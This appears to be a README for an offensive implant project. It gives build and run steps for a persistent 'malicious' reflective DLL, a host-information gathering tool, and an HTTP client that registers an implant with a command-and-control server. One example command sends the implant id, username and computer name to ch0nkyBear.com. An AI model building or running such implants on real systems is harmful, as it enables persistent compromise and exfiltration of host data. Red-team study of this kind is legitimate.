## To Compile the Malicious DLL

* Go to: reflectivedll> realDLL folder
* Run make to compile the DLL
* In the Command line, run .\testmDll.exe maliciousdll.dll

* The Malicious DLL currently checks for the Chonky.txt file and is Persistent.
* It does NOT currently include the communicationfuncs.cpp and .h files because it would cause errors
* TODO: get the communication functions working with the server, then add the files to the make file as a requirement for the dll

## To get Situational Awareness info

* Go to: reflectivedll> TestingFeatures> getInfo folder
* Run make to build the infoTest executable
* In the command line, run .\infoTest.exe 

* This executable will print out the data of the current machine
* It is currently not a feature of the dll

## To make an HTTP Request to the Server

* Go to: reflectivedll> TestingFeatures > http folder
* Run make to build the http executable
* In the command line, run .\http.exe fqdn port uri useTLS payload payloadLength
* The payload should be a hex string that (before converted to hex), is in the format "guid=implantTest&username=TestUser&=computername=TestComputer\r\n"
* EX: .\http.exe ch0nkyBear.com 443 /register 1 "23478y9hfj874" 13

* Currently: Issues handling payloads on the server side
* testInfo.cpp is a file that includes example hex encoded payloads to try out
